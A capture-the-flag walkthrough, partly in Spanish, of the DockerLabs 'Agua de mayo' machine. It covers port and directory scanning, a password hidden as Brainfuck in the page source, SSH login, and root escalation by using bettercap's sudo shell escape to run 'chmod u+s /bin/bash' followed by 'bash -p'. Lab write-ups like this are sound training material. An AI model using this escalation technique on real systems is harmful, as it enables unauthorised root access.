#Agua de mayo DockerLabs - 15/05/2024

#web - https://dockerlabs.es/#/

We performed a scan with nmap:

```shell
└─$ nmap -sVC -p- -n --min-rate 5000 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-15 21:03 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000099s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 75:ec:4d:36:12:93:58:82:7b:62:e3:52:91:70:83:70 (ECDSA)
|_  256 8f:d8:0f:2c:4b:3e:2b:d7:3c:a2:83:d3:6d:3f:76:aa (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.59 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.93 second
```

We do a subdomain scan to see what we find: 

```shell
└─$ gobuster dir -u "http://172.17.0.2/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                  
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 309] [--> http://172.17.0.2/images/]

```

Encuentra un subdominio "/images" entramos y vemos una foto llamada "agua-ssh.jpg":

![Captura de pantalla 2024-05-15 210411](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/6720af91-f6c1-4640-a30a-ea5752d0f048)

Seeing what else I could do I looked at the source code of the apache page ‘http://172.17.0.2/’:

![Captura de pantalla 2024-05-15 210502](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/04cc74f8-2388-434d-b202-cb18b2c29bd5)

I found this code and googled it to see what it could be:

![Captura de pantalla 2024-05-15 210522](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/9cc2c3b5-7fff-4dd0-974f-967445bc385c)

We can see that it is a ‘Brainfuck’ code.
We translate it and we get this:

![Captura de pantalla 2024-05-15 210554](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/f00c55f4-6a60-40ed-a884-064c2e5ef3e7)

```shell
bebeaguaqueessano
```

Log into the ssh server with the user ‘agua’ and the password ‘bebeaguaqueessano’:

```shell
└─$ ssh agua@172.17.0.2                                                                                 
agua@172.17.0.2's password: 
Linux adf1fc8e668d 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64
```

(si a mi me sale "-bash-5.2$" es porque ya la había vulnerado ignorarlo y tomarlo como si fuera el default)

We try to see if we can escalate privileges:

```shell
-bash-5.2$ sudo -l
Matching Defaults entries for agua on adf1fc8e668d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User agua may run the following commands on adf1fc8e668d:
    (root) NOPASSWD: /usr/bin/bettercap
-bash-5.2$

```

Run the binary as sudo:

```shell
-bash-5.2$ sudo /usr/bin/bettercap
```

![Captura de pantalla 2024-05-15 210910](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/55ab5e4d-8180-4291-aadb-cb1097493bb5)

We run help to see what commands we can do and we see this one:

![Captura de pantalla 2024-05-15 210926](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/896084ff-c342-4ef9-aa32-a7c0b3b28dec)

```shell
172.17.0.0/16 > 172.17.0.2  » ! chmod u+s /bin/bash
```

(Salimos)

```shell
-bash-5.2$ bash -p
```

```
bash-5.2# whoami
root
```
